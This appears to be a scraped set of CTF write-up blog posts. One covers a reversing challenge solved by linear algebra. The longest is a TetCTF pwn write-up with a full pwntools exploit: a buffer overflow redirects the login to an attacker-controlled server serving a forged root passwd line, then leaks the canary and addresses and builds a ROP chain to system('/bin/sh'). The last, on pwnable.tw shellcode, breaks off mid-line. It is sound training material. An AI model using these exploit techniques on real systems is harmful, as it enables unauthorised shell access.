130 points, 55 solves\nTo the moon! The correct sequence of inputs is the flag in ASCII.\nmoon\nAuthor: JoshDaBosh\nThis main funtion is to big, so we can\u0026rsquo;t decompile this code:\nTo view it as graph, we need to change the max node to 10000:\nAfter a first look, I see this program get 1293 number. Each number (n), for each number, it will call the corresponding function the number of times (n).\nExample, with at funtion 0, and n0 = 120, it will call func0 120 times, and there is inside func0:\nThere are 1293 global variable, after call func1292, this will check with constants, so this like a matrix multiply:\nFirst try, I using get_bytes() to get all byte of each function, then check them to get these constant, but it incorrect.\nSo I decided to create asm file, then parse constant on this.\nI use this script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from pwn import * with open(\u0026#39;moon.asm\u0026#39;,\u0026#39;r\u0026#39;) as f: ins = f.readlines() cons = [] for n in range(1293): var= 0x23AB900 idx = ins.index(f\u0026#39;func{n} proc near\\n\u0026#39;) + 5 ls = [] while idx \u0026lt; len(ins) and f\u0026#39;func{n}\u0026#39; not in ins[idx]: if f\u0026#39;rax, cs:qword_{hex(var)[2:].upper()}\u0026#39; in ins[idx]: nextline = ins[idx+1] try: number = int(nextline.split(\u0026#39; \u0026#39;)[6].replace(\u0026#39;h\u0026#39;,\u0026#39;\u0026#39;).strip(\u0026#39;\\n\u0026#39;),16) except: ls.append(0) var+=8 idx+=1 continue if \u0026#39;add\u0026#39; in nextline: ls.append(number) elif \u0026#39;sub\u0026#39; in nextline: ls.append((~number+1)\u0026amp;(2**64-1)) var+=8 idx+=1 assert(var==0x23AE168) # cons.append(ls) print(cons) And here is the result:\nNow I have matrix 1293x1293, we(m1dm4n) use sagemath to solve it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from ast import literal_eval from sage.all import matrix, vector x =[63393110, 58886046, 67388269, 63461910, 67974569, 60993599, 67115864, 65470744, 66191693, 64407727, 62057872, 61486263, 64907821, 58373354, 64768373, 59683813, 63725637, 72094089, 61331703, 68980247, 66685884, 57971615, 64038009, 61162051, 66550714, 62707285, 69620832, 64209208, 65650269, 66386253, 65096786, 63795576, 63701384, 61965114, 66725179, 62279606, 61438421, 66127795, 60091704, 68532768, 63203223, 66066067, 62951475, 58143520, 63211575, 64079813, 65363478, 69322487, 63916034, 66942647, 70386888, 61094871, 66223409, 68766697, 66485027, 59883256, 57160034, 58089614, 62666296, 61833179, 61580490, 66266430, 69522914, 70210323, 54901539, 65461415, 58573227, 68323975, 59777456, 67938344, 58876260, 66793117, 61596319, 59203560, 58628036, 61772847, 66619886, 63149749, 66355939, 61266423, 58991064, 64601226, 66989008, 60434116, 67827499, 67584476, 58802564, 66843272, 65963725, 63570581, 61116828, 71261997, 69478738, 65316131, 70294335, 63203329, 65114038, 67993300, 56103231, 60341681, 62992943, 58697987, 62835605, 68570464, 57459465, 66127858, 63146318, 68614022, 58734257, 63036806, 64538253, 56068970, 63653137, 60327882, 68296125, 71865536, 65626317, 68816304, 58679314, 63352410, 70154891, 62936398, 61748954, 58898280, 60996317, 56631617, 56644617, 71009917, 69966086, 68681903, 59700700, 61535451, 55690965, 58947926, 58793481, 63069002, 64275033, 62215388, 60115793, 63124349, 69986678, 69411299, 67530443, 63730621, 65055498, 70043043, 62670977, 69001174, 63181872, 62269354, 65954864, 62804013, 65119689, 62468267, 63540301, 67965533, 62643943, 62332625, 69719564, 57857109, 55843853, 66766315, 57377721, 68843621, 63178360, 60793568, 58640375, 65608923, 71633486, 64441495, 63150215, 59260189, 67796620, 66053370, 68301238, 62928535, 71236589, 66199794, 61910903, 58391902, 60648945, 56141696, 70969476, 66343227, 61502729, 68525235, 66198293, 66942508, 64340209, 62982385, 64031650, 58011320, 67265701, 65362374, 59794852, 61591197, 64404489, 63316494, 62319358, 63445445, 58352667, 63082260, 65255867, 61265446, 58845803, 65562972, 70037593, 71132109, 65507136, 68189067, 66382708, 62189035, 64460646, 59879304, 67087877, 62257722, 57302811, 62239780, 63803838, 64664146, 67165718, 65696383, 61959416, 62907666, 63964334, 59828944, 61597321, 67912593, 63482202, 62178713, 60092005, 59701215, 63943967, 62509855, 66116266, 65437589, 63899800, 60139233, 65293339, 57335738, 59589223, 68945985, 63932367, 66781353, 65921842, 59605275, 61144244, 62442386, 66848033, 65723791, 63475692, 70572960, 65709089, 62588500, 68746336, 59794119, 63029650, 63321427, 63496482, 57521905, 72055618, 60000693, 62741235, 58827637, 62675830, 70872414, 61950549, 61878697, 68636636, 64505071, 68317055, 67685794, 60246794, 59848833, 60249967, 62995099, 66986046, 66655346, 65577991, 66155927, 58690559, 66201543, 61710155, 63714967, 60759398, 58429218, 65228584, 62469345, 63437707, 63322269, 65522877, 61156110, 58823896, 69092681, 67888109, 63417654, 63175290, 62113113, 61460206, 64883652, 61913508, 66863077, 59133427, 67950357, 59455812, 64363967, 60446995, 61009720, 62409918, 60529864, 61663777, 65496176, 62923009, 63070442, 68312324, 63185532, 67094260, 66481714, 63666841, 62995259, 65303691, 63139855, 68799250, 59247590, 63655839, 65696661, 60671850, 62871537, 64741237, 66766319, 64090332, 61181100, 59720153, 61762493, 68425714, 70557785, 62677730, 61901946, 68718380, 64641148, 62657424, 60013121, 70238319, 56094545, 62607485, 66870263, 61756975, 62355157, 67360262, 58942315, 59602883, 63462338, 59481837, 68091157, 72287977, 70334331, 62927116, 65259307, 62040210, 64232408, 64442117, 67947419, 64160185, 63366312, 59946214, 61026456, 58741830, 62960766, 66450728, 66505938, 67149530, 61072357, 69434685, 60357789, 67573561, 69023002, 59730941, 58935616, 66378831, 61108903, 61409883, 71671845, 63927404, 66501530, 62338630, 65906841, 69391288, 61597802, 65706606, 65497799, 65756436, 65097328, 60313432, 61925794, 66750668, 58520439, 68490328, 65331837, 69255180, 61137234, 64880920, 64932335, 66865669, 59564266, 68440338, 67997315, 57055156, 63180971, 65505869, 60964787, 67326648, 67998107, 58019084, 66959614, 64328778, 58933843, 61772014, 58724642, 64902089, 70739221, 62149916, 59910691, 68365922, 59059516, 64020707, 65351622, 66306822, 59543949, 58946162, 56491796, 62667863, 63810898, 63656212, 66060791, 68839747, 59648441, 64197215, 65805560, 63753048, 65665786, 65160325, 62906786, 59879406, 59685602, 61672831, 62561035, 57239715, 63965352, 67955093, 65170239, 63315100, 63323141, 65829596, 63927013, 58863641, 63994605, 62391436, 66428499, 64595315, 62497257, 61620428, 63335006, 62720621, 65982147, 61113620, 61288231, 59742953, 67736553, 67951407, 64365570, 69788971, 69879395, 67431800, 69115881, 64562804, 68024779, 63338825, 67337833, 71832964, 65794390, 65628954, 61222148, 65671258, 60456543, 63677791, 66152886, 58045838, 59839857, 64446131, 66346357, 60030406, 69225422, 58963891, 64701931, 65486215, 64468588, 62540974, 62756799, 64683470, 62403153, 67190555, 63042724, 68225539, 70260132, 59411467, 66327868, 57911187, 62070454, 63434516, 61672692, 58539958, 65924384, 62533988, 57143065, 65806188, 65949606, 70548213, 58946142, 70004508, 61948315, 60119035, 64951496, 57778508, 66952030, 67051608, 66421165, 57825664, 67125584, 59374065, 64915709, 64560757, 64154276, 67041884, 62148937, 65915582, 62443792, 61719110, 64778207, 63247675, 66355317, 67560388, 67299326, 61350675, 57814218, 64915724, 61022577, 63576217, 60633687, 65174267, 60905016, 57624439, 61529215, 71540159, 61684732, 63749566, 65123039, 59362785, 61663653, 70674926, 65102966, 65708452, 60136201, 61637743, 57725710, 67827598, 67507688, 60563794, 63612363, 55231545, 62172587, 71086047, 64107426, 60069087, 62992579, 63253365, 64096981, 62516293, 64320626, 61562154, 71698176, 64577215, 65811115, 62432412, 72558354, 60990113, 70861623, 58141358, 68522570, 66276658, 66749904, 64598466, 59342460, 63733141, 65458800, 62198507, 65971378, 68368967, 57706820, 61553810, 65276070, 61878245, 69081411, 58797147, 66155886, 63574184, 66431844, 64499077, 65383330, 66426836, 68588212, 63755094, 63394198, 68109115, 68268956, 58349221, 60191212, 58947992, 64663574, 66249731, 68942368, 62864378, 67260033, 63365125, 64173411, 63485552, 63793557, 63542929, 64677648, 63044471, 67893258, 61874609, 59820527, 63618300, 68570248, 60301843, 59297598, 67821801, 55070536, 58259904, 64399005, 64377201, 65672298, 65630841, 62935180, 66982480, 62577326, 63479803, 65495968, 61625540, 61309023, 61972539, 62697119, 64977834, 61825094, 58771305, 62970866, 65826654, 62792345, 69084263, 69910343, 57541923, 66552410, 65643064, 68787174, 62362145, 65982831, 67346973, 61932619, 67973985, 62322824, 65616933, 67548663, 67024029, 67246683, 64792744, 67119347, 58815015, 69627024, 60560699, 67649584, 63880450, 65202240, 62306622, 65527240, 66114026, 66070381, 64688779, 66972213, 60341445, 66058724, 68623345, 66555932, 59437122, 61723449, 66310846, 58875973, 59528145, 66102516, 63259011, 67142825, 64120753, 66745601, 71152953, 63524056, 59587602, 61488955, 64682112, 63642139, 67775297, 65278369, 63240216, 60078915, 65803512, 69119349, 62693018, 64398584, 62458955, 71036231, 58733198, 65735399, 63063132, 61793143, 67984823, 67810447, 63276784, 64880968, 61957930, 64328577, 64913156, 64199943, 60687258, 63119964, 61963604, 62834612, 64629283, 69335683, 65343092, 69292433, 64220379, 64575298, 63007466, 70698100, 65520916, 63108451, 61703192, 62803405, 58393116, 62397295, 65539148, 57445311, 67006048, 62133729, 59435381, 65387910, 66735213, 65744719, 62429520, 61398907, 64157879, 64702252, 61385630, 59789788, 62134162, 60278381, 57635866, 65459395, 66486830, 57595243, 63099046, 60898412, 66904367, 63773349, 63511825, 57028226, 60856751, 63545666, 71623472, 65231758, 61850509, 59788938, 68536427, 64523947, 62866475, 69401218, 61886474, 62580520, 65651667, 58858406, 64583938, 64502037, 59023982, 67142564, 57180424, 62659998, 63315915, 63973801, 62946402, 62402120, 64685052, 66880846, 65055053, 70921211, 66296346, 61641404, 61116543, 63356623, 56583804, 66455163, 65315624, 70640356, 61966120, 66176030, 59226249, 67434530, 70874682, 68492529, 63880921, 58493546, 64631727, 61161474, 66349920, 65286853, 65287128, 65721654, 68971371, 68858452, 71860280, 59758346, 63458431, 68771044, 63299519, 70515653, 69474259, 61879136, 61822690, 61475742, 64952547, 68666602, 65665224, 59886692, 61837505, 60276848, 64288884, 66669554, 68079823, 62391729, 68350841, 62247001, 60186351, 67364395, 65720731, 63610260, 71070984, 64941837, 68323806, 64337360, 63281518, 58847534, 64295557, 65230303, 56504147, 70608348, 64287747, 57968093, 59355459, 67832972, 69309803, 62354379, 65382321, 68982293, 65138255, 65736303, 67047003, 59616125, 65438071, 64074701, 63125468, 67104202, 57339620, 69262389, 62632124, 66339499, 61398893, 61507376, 57835509, 61610354, 57325557, 68370866, 68581960, 59750453, 64440728, 60395454, 63984770, 60036834, 63809497, 58319627, 66324106, 65378683, 63361855, 64403076, 64035143, 67092982, 63303125, 63728233, 64168106, 64039635, 67080786, 64076386, 59996644, 59878626, 68501368, 60791159, 65573102, 68251111, 60449159, 61320211, 66174591, 64130387, 68825504, 66404519, 61261735, 67259534, 66279175, 68247330, 66546879, 61146981, 62783716, 64642481, 62228998, 64958114, 63582167, 66645336, 63562460, 70915819, 58498774, 73345342, 62451456, 68162332, 66581518, 60221360, 60644964, 72588520, 65012795, 63756243, 59691866, 71350499, 61243014, 65443056, 64212632, 71585482, 64438118, 61901529, 68162667, 63504371, 67061811, 64611349, 61595811, 68261827, 64251173, 70976178, 66928294, 60556196, 62630812, 62513720, 61588800, 65818751, 59989252, 62313318, 64841680, 61505489, 65599862, 66891354, 64299474, 63929603, 62735748, 60023471, 60806829, 64644240, 67061124, 64539318, 64560037, 63798301, 60089887, 66577770, 64449575, 63712105, 60668002, 68170241, 64496459, 64981855, 64001244, 67201096, 64877985, 68961593, 67093753, 70594163, 64231731, 62960920, 63346755, 65049580, 64619044, 67798649, 66753396, 56641105, 60079487, 62399786, 69040678, 64968096, 61368027, 67156445, 58589688, 66374354, 66923296, 67187007, 57221360, 69400344, 61452586, 60561301, 63745871, 62401654, 57905635, 70711289, 71739876, 62689268, 65616981, 63764296, 68775654, 60905723, 65234499, 66126094, 63615750, 60750598, 60875584, 64732830, 72160942, 65304181, 63640175, 65956966, 64084769, 63306358, 68964218, 67006036, 61693648, 64719348, 58892500, 57173868, 68636342, 65825351, 69018293, 64239085, 67811872, 65909394, 68908485, 65340332, 60898563, 56371321, 63914361, 58201012, 57671664, 60073909, 71024380, 62599650, 59596612, 68324686, 60901052, 66939589, 64773073, 65262783, 63566973, 60148082, 68526829, 64805766, 62796988, 62024872, 61797643, 65028249, 59257568, 68113793, 68491842, 63153830, 66690286, 68775332, 66266514, 63254842, 63130917, 65593302, 63182667, 63768876, 67767200, 64109437, 64381504, 72201385, 67152768, 60841307, 66800358, 61947130, 64569744, 69834736, 69845345, 66108859, 59823511, 61424884, 68779195, 59809936, 61719208, 64179793, 69550658, 60155480, 62360267, 68143105, 69061770, 68249232, 66404459, 66966499, 65711841, 62749629, 60944249, 66024271, 67896753, 59078835, 64479608, 69072797, 71592027, 64824277, 62179662, 61133810, 69460076, 62959793, 60586792, 63626388, 67787832, 63148236, 68028357, 63140007, 67034764, 61601083, 61035415, 65735182, 59771131, 64355082, 63615917, 65697689, 64252820, 65727243, 65757176, 65674788, 64811824, 66540130, 56962628, 61273162, 64722521, 59986785, 68880683, 64602213, 65575139, 66570840, 66835867, 66141525, 66455992, 61114307, 67042048, 65122125, 64685224, 65705181, 70862867, 64968513, 68388371, 63168135, 66017478, 66197152, 63397210, 65012292, 58084142, 63476327, 63757101, 63777473, 61029451, 67501439, 64810124, 57805337, 62001667, 60304571, 61212696, 70907445, 66499657, 63667208, 64770038, 63074909, 63372274, 60106009, 63552277, 64111671, 66744147, 71354153, 66812994, 61093570, 67393117, 65291204, 64897365, 60822946, 68142213, 62028544, 67726158, 63130222, 64278258, 69386949, 57828324, 59976769, 64174153, 64426136, 59610026, 62670269, 61393249, 65526473, 58350005, 60830239, 56981028, 65898704, 63481409, 63559057, 66450103, 65886675, 64272274, 62972970, 60808619, 60137341, 65333639, 63861224, 66150677, 68517483, 59793918, 62825513, 65272405, 58852528, 61204741, 60327327, 65641981, 63550731, 57206292, 69422190, 63609112, 64224337, 71601367, 61159395, 63619876, 64330679, 61405309, 70082641, 63752794, 63156002, 69010303, 63197830, 64593898, 64859103, 67765582, 65401404, 63564640, 66498670, 67379786, 62900928, 66594632, 64566572, 62837912, 71342632, 72967396, 67851757, 65819307, 68444173, 69887757, 67477826, 71228352, 60042915, 61547268, 64207493, 58124059, 64028190, 61742897, 64786994, 61966640, 62471227, 62746390, 61650413, 65212275, 63419941, 61777360, 60800092, 65494190, 67202755, 63501212, 65078012, 67079286, 59084245, 65591500] with open(\u0026#39;parse.py\u0026#39;, \u0026#39;r\u0026#39;) as f: dat = f.read().strip(\u0026#39;\\n\u0026#39;) mat = literal_eval(dat) mat = matrix(mat).T print(mat.rank()) x = vector(x) flag = \u0026#34;\u0026#34; print(mat.solve_right(x).list()) for i in mat.solve_right(x).list(): flag += chr(int(i)) print(flag) Flag: actf{3verything_is_just_linear_algebr4_33e431e52e896c92}\ngiza (Unsolved, but i will try to re do if i free) Can you make it to the top of giza?\nHint: you got this\n","description":"Writeup for Angstrom CTF 2023","id":10,"section":"posts","tags":["Reverse"],"title":"Angstrom CTF 2023","uri":"https://duythucne22.github.io/posts/2023/angstromctf2023/"},{"content":"TetCTF 2023 - pwn01 You can download challenge files in my repo: pwn01.zip\n1. Find bug \u0026amp; Generate idea In main(), there are 3 options for us to choose:\nHowever, we cannot do anything except login so that\u0026rsquo;s the first thing we need to do. Here is the result from IDA for function login():\nMaybe because a large space for each variabel so IDA seems to work wrong when defining variables, so we need to use debugger to test our input to check if there are any bug when we input data. By inputing max allowed bytes, we got a Buffer Overflow in username which change the ipv4, variable v8 to our desired ipv4 and when it runs connect_to_server(), it will connect to that ip at port 6666:\nHence, we can make the program connect to our vps and get the data. In check_credential(), it executes fgets() to get data from the connected server and that data is from file /etc/passwd of server. How did I know? I guessed that it connect to an internel server because domain tet.ctf is not valid in public, but it\u0026rsquo;s not loopback 127.0.0.1 so maybe we can try, I tried connecting to server with port 6666 and get leaked:\nSo we know the format. We still need to make the global variable loggedIn to 1:\nSo the problem is the crypt() function. After a few attempts trying with different combination, I found out that this key and salt give hash the same with salt:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // gcc findkey.c -o findkey -lcrypt #include \u0026lt;crypt.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char *salt = \u0026#34;$6$tet$.84DBkpbpZEcXF.WKDJJDSStwXYJir3.WSKOma1e5N20d4SDpbMPLryTcZaB7buisGAsT2GW1bdad74Hh3Ply0\u0026#34;; char *res = \u0026#34;\u0026#34;; res = crypt(\u0026#34;\u0026#34;, salt); puts(res); salt = \u0026#34;$6$tet$tXRYc/J5H1lWOJDDUv2c2yKKc5SJcozGLLyPbIenZuqhv/2bIxX81n6z2KAisRDQvRMNJGAEDpCyCRmODZHO1.\u0026#34;; res = crypt(\u0026#34;\u0026#34;, salt); puts(res); } I tried with null key and with salt taken from server. When we got the salt (or hashed password) then we go to vps and make it echo the string below to the client who connected to:\nroot:$6$tet$tXRYc/J5H1lWOJDDUv2c2yKKc5SJcozGLLyPbIenZuqhv/2bIxX81n6z2KAisRDQvRMNJGAEDpCyCRmODZHO1.:0:0:root:/root:/bin/bash\\n\\ Then we can login. The only option we can use is option 2 with a clearly Buffer Overflow again when reading data from files:\nAfter a few times reading, I recognized the file might be generated by urandom (option 5 is urandom file) so it will have all bytes from null byte to byte 0xff. So the idea is to leak canary, exe address and libc address by reading much data to concate the buffer with those value, then recover back byte to byte from higher stack address to lower stack address, from saved rip to saved rbp to canary to make the program work normally. Finally, with that leaked address we can get shell.\nSo we need to get the file first so that we can build our exploit easily. To that, we will try to print just 0x100 because if we read\nGet file script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 #!/usr/bin/python3 from pwn import * from binascii import hexlify, unhexlify context.binary = exe = ELF(\u0026#39;./chall\u0026#39;, checksec=False) filelist = { 1: \u0026#34;100KB\u0026#34;, 2: \u0026#34;10KB\u0026#34;, 3: \u0026#34;1KB\u0026#34;, 4: \u0026#34;1MB\u0026#34; } option = 4 while True: if args.LOCAL: p = process(exe.path) else: p = remote(\u0026#34;139.162.36.205\u0026#34;, 31337) ###################### ### Stage 1: Login ### ###################### if args.LOCAL: t1 = listen(6666) ip = b\u0026#39;127.0.0.1\\0\u0026#39; else: # ip = \u0026lt;vps ip string\u0026gt; + b\u0026#39;\\0\u0026#39; p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;1\u0026#39;) payload = b\u0026#39;root\\0\u0026#39; + b\u0026#39;A\u0026#39;*123 + p64(0) + ip p.sendafter(b\u0026#39;Username: \u0026#39;, payload.ljust(0xb0, b\u0026#39;A\u0026#39;)) p.sendafter(b\u0026#39;Password: \u0026#39;, b\u0026#39;\\0\u0026#39;*8 + b\u0026#39;B\u0026#39;*0x78) if args.LOCAL: t1.sendline(b\u0026#39;root:$6$tet$tXRYc/J5H1lWOJDDUv2c2yKKc5SJcozGLLyPbIenZuqhv/2bIxX81n6z2KAisRDQvRMNJGAEDpCyCRmODZHO1.:0:0:root:/root:/bin/bash\u0026#39;) ################################### ### Stage 2: Leak data in files ### ################################### p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;2\u0026#39;) if args.LOCAL: t1.close() # Check if we have read some data try: with open(filelist[option], \u0026#39;rb\u0026#39;) as f: existdata = f.read() except: existdata = b\u0026#39;\u0026#39; p.recvuntil(b\u0026#39;read: \u0026#39;) p.sendline(str(option).encode()) # Make it read until where we leaked (these data is not value after leaked) p.recvuntil(b\u0026#39;read?\u0026#39;) if existdata: datalen = len(existdata) while True: if datalen \u0026gt; 0x100: p.sendline(str(0x100).encode()) datalen -= 0x100 else: p.sendline(str(datalen).encode()) datalen = 0 output = p.recvuntil(b\u0026#39;How many bytes to read?\u0026#39;, drop=True, timeout=2) if not output: while True: if b\u0026#39;No more data!\u0026#39; in p.recvline(): print(\u0026#34;Done!\u0026#34;) p.close() exit() if not datalen: break newdata = b\u0026#39;\u0026#39; done = 0 while not done: p.sendline(str(0x100).encode()) # \\n is counted as \\0 output = p.recvuntil(b\u0026#39;How many bytes to read?\u0026#39;, drop=True, timeout=2) if not output: while True: if b\u0026#39;No more data!\u0026#39; in p.recvline(): done = 1 break # Make sure we receive enough 0x100 byte and the byte \\n # will be counted as \\0 if len(output)==0x101: newdata += output[:-1] # If not, that mean we meet a null byte so we write down # what we leaked and need to restart all the progress else: if not done: newdata += output[:-1] + b\u0026#39;\\0\u0026#39; with open(filelist[option], \u0026#39;ab\u0026#39;) as f: f.write(newdata) p.close() if done: exit() break p.interactive() So if we get the file, how we can use it? We will create a function which takes 3 parameters, one is the byte to be seeked, one is the data and one is the offset (the length from input buffer to the byte we need to recover):\n1 2 3 4 5 6 7 8 9 10 11 12 13 def findbyte(x, data, length): step = [] while True: if x in data[length:length*2]: pos = length + data[length:length*2].index(x) + 1 step.append(pos - length) step.append(length) break else: data = data[length:] step.append(length) return step 2. Exploit Stage 1: Login As the script for getting file, we can reuse the code:\n1 2 3 4 5 6 7 8 9 10 11 12 if args.LOCAL: t1 = listen(6666) ip = b\u0026#39;127.0.0.1\\0\u0026#39; else: # ip = \u0026lt;vps ip string\u0026gt; + b\u0026#39;\\0\u0026#39; p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;1\u0026#39;) payload = b\u0026#39;root\\0\u0026#39; + b\u0026#39;A\u0026#39;*123 + p64(0) + ip p.sendafter(b\u0026#39;Username: \u0026#39;, payload.ljust(0xb0, b\u0026#39;A\u0026#39;)) p.sendafter(b\u0026#39;Password: \u0026#39;, b\u0026#39;\\0\u0026#39;*8 + b\u0026#39;B\u0026#39;*0x78) if args.LOCAL: t1.sendline(b\u0026#39;root:$6$tet$tXRYc/J5H1lWOJDDUv2c2yKKc5SJcozGLLyPbIenZuqhv/2bIxX81n6z2KAisRDQvRMNJGAEDpCyCRmODZHO1.:0:0:root:/root:/bin/bash\u0026#39;) Stage 2: Leak canary and stack address Leak canary is necessary but is stack needed? Yeah of course because maybe if we need to leak saved rip of a binary function, we need to overwrite canary and saved rbp to make sure no null byte is inserted between input buffer and saved rip. After that, we need to recover canary and saved rbp so we need to know what is the address of saved rbp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;2\u0026#39;) if args.LOCAL: t1.close() with open(\u0026#39;data/1MB\u0026#39;, \u0026#39;rb\u0026#39;) as f: datas = f.read() # Offset 0x108 will concatenate buffer with canary # But due to null byte at LSB of canary so we overwrite that # null byte to a byte not null so puts() will print canary out offset = 0x109 datas = datas[offset:] p.recvuntil(b\u0026#39;read: \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;read?\u0026#39;) p.sendline(f\u0026#39;{offset}\u0026#39;.encode()) output = p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) canary = u64(output[offset-1:offset-1+8]) \u0026amp; 0xffffffffffffff00 stack_leak = u64(output[offset-1+8:] + b\u0026#39;\\0\\0\u0026#39;) log.info(\u0026#34;Canary: \u0026#34; + hex(canary)) log.info(\u0026#34;stack_leak: \u0026#34; + hex(stack_leak)) # Recover the null byte of canary for size in findbyte(b\u0026#39;\\0\u0026#39;, datas, offset): datas = datas[size:] p.sendline(f\u0026#39;{size}\u0026#39;.encode()) p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) p.sendline(\u0026#39;-1\u0026#39;.encode()) Stage 3: Leak exe address Let\u0026rsquo;s get exe address leak:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 with open(\u0026#39;data/1MB\u0026#39;, \u0026#39;rb\u0026#39;) as f: datas = f.read() # Overwrite canary and saved rbp to leak saved rip which is exe address offset = 0x118 datas = datas[offset:] p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;read: \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;read?\u0026#39;) p.sendline(f\u0026#39;{offset}\u0026#39;.encode()) output = p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) exe_leak = u64(output[offset:offset+6] + b\u0026#39;\\0\\0\u0026#39;) exe.address = exe_leak - 0x247c log.info(\u0026#34;Exe leak: \u0026#34; + hex(exe_leak)) log.info(\u0026#34;Exe base: \u0026#34; + hex(exe.address)) # Recover canary and saved rbp payload = flat( canary, stack_leak, ) payload = payload[::-1] for i in range(len(payload)): for size in findbyte(p8(payload[i]), datas, offset - i): datas = datas[size:] p.sendline(f\u0026#39;{size}\u0026#39;.encode()) p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) p.sendline(\u0026#39;-1\u0026#39;.encode()) Stage 4: Leak libc address This stage is just the same as the previous stage:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 with open(\u0026#39;data/1MB\u0026#39;, \u0026#39;rb\u0026#39;) as f: datas = f.read() # Overwrite canary, saved rbp, saved rip of the subfunction # and concate with saved rip of main, which is libc address offset1 = 0x128 offset2 = 0x120 datas = datas[offset1:] p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;read: \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;read?\u0026#39;) p.sendline(f\u0026#39;{offset1}\u0026#39;.encode()) output = p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) libc_leak = u64(output[offset1:offset1+6] + b\u0026#39;\\0\\0\u0026#39;) libc.address = libc_leak - 0x29d90 log.info(\u0026#34;Libc leak: \u0026#34; + hex(libc_leak)) log.info(\u0026#34;Libc base: \u0026#34; + hex(libc.address)) # Recover canary, saved rbp, saved rip of the function payload = flat( canary, stack_leak, exe_leak, )[::-1] for i in range(len(payload)): for size in findbyte(p8(payload[i]), datas, offset2 - i): datas = datas[size:] p.sendline(f\u0026#39;{size}\u0026#39;.encode()) p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) p.sendline(\u0026#39;-1\u0026#39;.encode()) Stage 5: Get shell We input payload in a reverse order as previous stage:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 with open(\u0026#39;data/1MB\u0026#39;, \u0026#39;rb\u0026#39;) as f: datas = f.read() p.sendlineafter(b\u0026#39;choice: \u0026#39;, b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;read: \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) pop_rdi = libc.address + 0x000000000002a3e5 ret = libc.address + 0x0000000000029cd6 payload = flat( canary, canary,\t# Fake saved rbp ret, pop_rdi, next(libc.search(b\u0026#39;/bin/sh\u0026#39;)), libc.sym[\u0026#39;system\u0026#39;] )[::-1] offset = 0x108 + len(payload) for i in range(len(payload)): for size in findbyte(p8(payload[i]), datas, offset - i): datas = datas[size:] p.sendline(f\u0026#39;{size}\u0026#39;.encode()) p.recvuntil(b\u0026#39;\\nHow many bytes to read?\u0026#39;, drop=True) p.sendline(\u0026#39;-1\u0026#39;.encode()) 3. Get flag Flag is TetCTF{w4rm_uP_ch4lL3ng3__g0Od_g4m3!}\n","description":"Spring CTF before spring break","id":11,"section":"posts","tags":["ctf","pwn","writeups"],"title":"TetCTF 2023","uri":"https://duythucne22.github.io/posts/2023/tetctf2023/"},{"content":"Pwnable.tw Start - 100pts Leak address Nothing\u0026rsquo;s interesting except the highlighted ROP, it will help us print out 0x14 bytes of data on esp as you can see mov ecx, esp. When in GDB, we can also see that there will be a lot of stack address:\nSo leaking one of them will help us get the pointer point to our shellcode. And that ROP gadget is at _start+38, which means after that print out, it will get input from us again. So our first payload will look like this:\npayload1 = b\u0026#39;A\u0026#39;*20 # Padding to eip\rpayload1 += p32(0x08048086) # ROP gadget Running that first payload and we will get leak stack address, also we are prompted to input again\nSo we will write a script and take that address, then calculate the address that we will input the second time:\nWhen we check in GDB after int 0x80 of syscall write, we know that the leaked address is at $esp + 0x8:\nWhen we are prompted to input the second time, we will just input string of cyclic(0x14) in to check at the second ret, where is our shellcode (string of cyclic(0x14)):\nWe can see that ecx contains the begining of our shellcode. With the leaked address, we will calculate the offset then the address of the begining of shellcode, then we pass it to eip. Offset can be calculate as\noffset = \u0026lt;Leak address\u0026gt; - \u0026lt;Begining of shellcode address\u0026gt;\roffset = 0xff9e19e0 - 0xff9e19dc # offset = 4 That\u0026rsquo;s nice! We get everything we need. Let\u0026rsquo;s move to stage 2.\nGet shell Now we have address point to our shellcode, we just simply input our shellcode at the second input. But before we continue, we need to write string /bin/sh\\x00 somewhere and then move the pointer point to that string to ebx to execute execve.\nThe ideal place is after eip. after ret, since the eip being replaced with the address of our shellcode and the stack will add 0x4, which esp now contain pointer point to our string /bin/sh\\x00. So in shellcode, we will make it move address of esp after second ret (contains string /bin/sh\\x00) to ebx.\nstack_leak = u32(p.recv(4))\rpayload2 = 